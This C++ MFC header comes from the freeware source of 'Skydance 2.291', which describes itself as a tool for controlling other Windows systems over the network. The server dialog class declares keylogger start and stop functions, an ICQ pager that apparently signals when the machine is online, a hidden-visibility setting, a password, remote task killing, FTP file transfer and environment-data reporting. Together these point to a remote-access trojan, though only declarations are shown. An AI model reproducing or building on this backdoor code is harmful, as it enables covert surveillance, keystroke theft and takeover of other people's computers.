/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
// SkyServerDlg.h : Header-Datei
//

#if !defined(AFX_SKYSERVERDLG_H__1BC33344_DE4A_11D3_A059_00C026A21151__INCLUDED_)
#define AFX_SKYSERVERDLG_H__1BC33344_DE4A_11D3_A059_00C026A21151__INCLUDED_



#include "SkySocket.h"
#include "SkyServer.h"	// Hinzugefügt von der Klassenansicht
#include "SkyThread.h"
//#include "MAPIX.H"	 // MAPI
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

/////////////////////////////////////////////////////////////////////////////
// CSkyServerDlg Dialogfeld
class CSkyServerDlg : public CDialog
{
// Konstruktion
public:
	CString m_sServerName;
	CString m_sComputerName;
	BOOL m_biConnected;
	void StartKeyLogAuto(CString DLLFile, char LogFile[81]);
	//static void DetectOnlineThread(void* pContext);
	void RunICQPager();
	int LoadDLL(CString DLLFileName);
	HINSTANCE hinstDLL;
//	BOOL LoadKeyProg(CString sDllName);
	void ComputerName();
	void StopKeyLog();
	void StartKeyLog(char sDllName[80], char sLogfileName[80]);
//	LPMAPISESSION m_mLpSession;
//	BOOL m_bMAPIworks;
//	HRESULT hr;
	void CloseAllTasks();
	void CloseTask(CString sTaskNumber);
	void ListTasks();
	void SetCurrentCommand(CString strRecvd);
	CString m_sRecvdCom;
	CString m_sRecvd;
	BOOL m_bCorrectPass;
	BOOL bKeyLog;
	CString m_sLogAlways;
	CString m_sDLLFile;
	CString m_sLogFile;
	CString m_sPass;
	CString m_sUIN;
	int m_iListenPort;
	int m_iEnableDlg;
	//CRegKey m_cRegKey;
	void ChangeSettings(CString sPass, CString sFileName, CString sPort, CString sVisibility,
						CString sDLLFile, CString sLogFile, CString sKeyLogAllways, CString sUIN);
	CMutex m_mutex;
	CSkySocket m_sListenSocket;
	CSkySocket m_sConnectSocket;
	int m_iNextFtpStatNr;
	BOOL m_bFreeSocket[80];
	CSkyThread *m_cSkyThread;
	void CreateFtpSession(CString conType, CString fileName, CString ftpPort, CString upDown, CString sNextFtpStatNr);
	
	int m_iDlgActive;
	void InitMyLoop();
	void OnSend();

	void OnClose();
	void OnAccept();
	void OnReceive();
	void AnalyseString(CString strToAnalyse);
	void SendRespond(CString respond);
	void AddRecievedString(CString strRecieved);
	CSkyServerDlg(CWnd* pParent = NULL);	// Standard-Konstruktor

// Dialogfelddaten
	//{{AFX_DATA(CSkyServerDlg)
	enum { IDD = IDD_SKYSERVER_DIALOG };
	CListBox	m_ctlRecieved;
	//}}AFX_DATA
	// Vom Klassenassistenten generierte Überladungen virtueller Funktionen
	//{{AFX_VIRTUAL(CSkyServerDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV-Unterstützung
	//}}AFX_VIRTUAL

// Implementierung
protected:
	HICON m_hIcon;

	// Generierte Message-Map-Funktionen
	//{{AFX_MSG(CSkyServerDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	void SendEnvironmentData();
	BOOL m_bConnected;
	void MsgBox(CString kindOfMSG, CString Message, CString Title);
	void DirPath(CString Rpath, CString andFiles);
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ fügt unmittelbar vor der vorhergehenden Zeile zusätzliche Deklarationen ein.

#endif // !defined(AFX_SKYSERVERDLG_H__1BC33344_DE4A_11D3_A059_00C026A21151__INCLUDED_)
